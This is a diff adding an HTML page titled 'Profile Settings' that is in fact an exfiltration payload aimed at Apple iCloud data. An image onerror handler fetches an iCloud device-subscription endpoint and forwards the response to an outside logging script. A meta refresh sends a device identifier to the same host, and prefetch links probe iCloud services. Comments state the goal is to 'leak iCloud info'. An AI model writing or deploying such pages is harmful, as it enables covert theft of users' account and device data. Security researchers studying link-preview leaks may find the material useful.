@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Profile Settings</title>
+    <meta property="og:title" content="Profile Settings" />
+    <meta property="og:description" content="Update your profile settings" />
+    <meta property="og:image" content="https://mtrf3.github.io/finding/pixel.gif" />
+    
+    <!-- Try to leak iCloud info -->
+    <link rel="prefetch" href="https://p165-acsgateway.icloud.com/v3/devices/00008120-000A71643E60C01E/subscriptions/features/networking.privacy.subscriber" />
+    <link rel="prefetch" href="https://p165-quota.icloud.com/quotaservice/external/ios/" />
+</head>
+<body>
+    <img src="x" onerror="
+        fetch('https://p165-acsgateway.icloud.com/v3/devices/00008120-000A71643E60C01E/subscriptions/features/networking.privacy.subscriber')
+        .then(r => r.text())
+        .then(t => fetch('https://mtrf3.github.io/finding/log.php?icloud=' + encodeURIComponent(t)))
+        .catch(e => fetch('https://mtrf3.github.io/finding/log.php?error=' + e));
+    " />
+    
+    <!-- Try to leak more device info through meta refresh -->
+    <meta http-equiv="refresh" content="0;url=https://mtrf3.github.io/finding/log.php?device=00008120-000A71643E60C01E" />
+</body>
+</html>
